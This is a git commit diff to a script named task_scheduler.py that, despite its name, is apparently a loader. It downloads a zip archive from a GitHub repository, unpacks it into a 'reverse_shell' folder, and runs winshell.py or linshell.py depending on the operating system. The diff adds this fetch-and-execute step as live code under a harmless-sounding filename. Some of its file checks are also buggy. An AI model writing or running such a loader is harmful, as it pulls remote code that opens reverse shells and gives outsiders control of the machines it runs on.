423ccba4747eee542cf97a9edbe698051dc9c2f0
Jhean Phabio <127798956+jhonnunes443@users.noreply.github.com>
2024-04-10 22:28:37 -0300

    Update task_scheduler.py

--- task_scheduler.py
+++ task_scheduler.py
@@ -1,25 +1,53 @@
-
 from pathlib import Path
 import subprocess
 import time
 import os
+import urllib.request
+import platform
 
-url = "https://exemple.com"
-comand = f"wget {url}"
-unziping = "unzip main.zip"
-directory = "filefolder-main"
-execution = "python3 yourfile.py"
+url = "https://github.com/jhonnunes443/Security_folder/archive/refs/heads/main.zip"
+unziping = "tar -xvf main.zip"
+directory = "Security_folder-main/reverse_shell"
+task1 = "python3 winshell.py"
+task2 = "python3 linshell.py"
 
 
-file = Path("file.py")
-file2 = Path("filefolder-main")
+file1 = Path("Security_folder-main/reverse_shell/winshell.py")
+file2 = Path("Security_folder-main/reverse_shell/linshell.py")
+file3 = Path("main.zip")
 
-try:
-    if not file.is_file():
+def existing_file():
+    if file1.is_file or file2.is_file():
+        print("Changing directory.")
+        os.chdir(directory) 
+        print("#Running script.#")
+        
+    else:
+        print("Failure to acess file.\n")
+
+def executing_scripts():
+    try:
+        test =platform.system()
+        if test == "Windows":
+            print("Windows test sucessful, trying executing file...\n")
+            subprocess.run(task1, shell=True)
+        elif test == "Linux":
+            print("Linux test sucessful, trying executing file... ")
+            subprocess.run(task2, shell=True)
+        else:
+            print("None file was right.")
+    except Exception as e:
+        print("Fail to execute: ", e)
+
+existing_file()
+executing_scripts()
+
+def downloading_file():
+    if not file1.is_file or file2.is_file():
         print("File not exist. \n")
         time.sleep(1)
         print("Downloading file...\n\n") 
-        subprocess.run(comand, shell=True)
+        urllib.request.urlretrieve(url, file3)
         time.sleep(1)
         print("Unziping file.\n")
         subprocess.run(unziping, shell=True)
@@ -27,11 +55,11 @@ try:
         print("Changing directory.")
         os.chdir(directory) 
         print("#Running script.#")
-        subprocess.run(execution, shell=True)
-    elif file2.is_file():
-        print("Changing directory.")
-        os.chdir(directory) 
-        print("#Running script.#")
-        subprocess.run(execution, shell=True)
+        executing_scripts()
     else:
-        print("Failure to acess file.\n")
+        print("Process fail.")
+
+downloading_file()
+
+
+
